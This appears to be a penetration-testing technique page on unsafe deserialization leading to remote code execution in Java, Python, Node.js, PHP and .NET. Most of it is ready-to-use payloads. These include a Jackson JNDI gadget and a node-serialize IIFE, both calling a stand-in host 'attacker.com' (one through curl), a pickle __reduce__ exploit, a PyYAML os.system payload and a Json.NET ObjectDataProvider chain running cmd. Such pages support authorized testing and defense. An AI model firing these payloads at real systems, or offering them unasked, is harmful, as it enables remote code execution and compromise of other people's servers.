# JSON Deserialization RCE

## Overview
Unsafe deserialization occurs when an application reconstructs objects from serialized data (JSON, XML, binary formats) without validating the type or content. In languages where deserialization can trigger constructors, methods, or magic functions, an attacker who controls the serialized input can achieve Remote Code Execution (RCE) by crafting a payload that instantiates dangerous objects with attacker-controlled properties.

## When This Happens

You should test for deserialization vulnerabilities when:

- The application accepts serialized objects in request bodies, cookies, headers, or parameters.
- You see base64-encoded blobs, opaque tokens, or structured data in unexpected places.
- The backend uses languages/frameworks with known deserialization risks (Java, Python, PHP, .NET, Node.js).
- Response headers or error messages reveal the backend technology (e.g., `X-Powered-By: Express`, Java stack traces).

## Recon / Detection

### 1. Identify serialization formats

| Format | Indicators |
|--------|-----------|
| Java serialized | Starts with `ac ed 00 05` (hex) or `rO0AB` (base64) |
| PHP serialized | Contains `O:4:"User":2:{s:4:"name"...}` patterns |
| Python pickle | Starts with `\x80\x05` or various pickle opcodes |
| .NET BinaryFormatter | `AAEAAAD/////` (base64) |
| JSON with type info | `{"@type": "com.example.Class", ...}` or `{"__class__": ...}` |
| YAML | `!!python/object:os.system` |

### 2. Look for type hints in JSON

Some JSON-based frameworks support polymorphic deserialization via type hints:

```json
// Java (Jackson with DefaultTyping)
{"@class": "com.example.User", "name": "admin"}
["com.example.Command", {"cmd": "id"}]

// .NET (Json.NET with TypeNameHandling)
{"$type": "System.Diagnostics.Process, System", ...}

// Python (some frameworks)
{"__class__": "subprocess.Popen", "args": ["id"]}
```

### 3. Test for deserialization behavior
- Modify serialized data and observe if the server processes it (error messages, changed behavior).
- Send an invalid type hint — does the error message reveal class loading?
- Try known gadget classes and observe DNS/HTTP callbacks.

## Exploitation Steps

### Java — Jackson / custom deserializers

If the application uses Jackson with `DefaultTyping` enabled:

```json
["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", {
  "transletBytecodes": ["<base64-encoded-bytecode>"],
  "transletName": "exploit",
  "outputProperties": {}
}]
```

Or with known JNDI gadgets:
```json
{"@type": "com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName": "ldap://attacker.com:1389/exploit",
 "autoCommit": true}
```

**Tools**: `ysoserial` generates Java deserialization payloads for common gadget chains.

### Python — Pickle / YAML

Python's `pickle` can execute arbitrary code during deserialization:

```python
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Exploit())
```

For YAML (PyYAML with `yaml.load()` instead of `yaml.safe_load()`):
```yaml
!!python/object/apply:os.system ['id']
```

### Node.js — node-serialize / funcster

The `node-serialize` library has a known RCE via IIFE (Immediately Invoked Function Expression):

```json
{"exploit": "_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
```

### PHP — unserialize gadgets

PHP's `unserialize()` triggers `__wakeup()` and `__destruct()` magic methods:

```php
O:14:"ExampleClass":1:{s:4:"file";s:11:"/etc/passwd";}
```

**Tools**: `phpggc` generates PHP gadget chains for common frameworks (Laravel, Symfony, WordPress).

### .NET — BinaryFormatter / Json.NET

If `TypeNameHandling` is not `None`:
```json
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "$type": "System.Diagnostics.ProcessStartInfo, System",
      "FileName": "cmd",
      "Arguments": "/c whoami > C:\\temp\\out.txt"
    }
  }
}
```

**Tools**: `ysoserial.net` for .NET gadget chains.

## Example Payloads

```json
// Java JNDI injection via Jackson
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/a","autoCommit":true}

// Node.js node-serialize RCE
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl attacker.com')}()"}

// Detection payload (DNS callback)
{"@type":"java.net.InetAddress","val":"burp-collab.oastify.com"}
```

## Tools

- **ysoserial** (Java): Generate deserialization payloads for Java gadget chains.
- **ysoserial.net** (.NET): .NET equivalent.
- **phpggc** (PHP): Generate PHP gadget chains.
- **Burp Suite**: Inspect serialized data, test payloads in Repeater.
- **Collaborator / RequestRepo**: Detect blind deserialization via DNS/HTTP callbacks.
- **JNDI-Exploit-Kit**: Spin up LDAP/RMI servers for Java JNDI attacks.

## Real-World Notes

- Unsafe deserialization is listed as a critical vulnerability class (OWASP Top 10). It often leads directly to RCE with no user interaction needed.
- The key question is always: *"Does the application let me control the type of object being created?"* If yes, and if a gadget chain exists for the technology stack, RCE is likely possible.
- JSON-based deserialization attacks are becoming more common as applications move to JSON APIs but keep polymorphic type handling enabled for convenience.
- Even if you cannot achieve RCE, deserialization bugs often enable SSRF (via URL-fetching classes) or file read (via file-handling classes).

## References

- `techniques/xxe-injection.md`
- `techniques/server-side-template-injection.md`
- `methodology/web-recon-methodology.md`
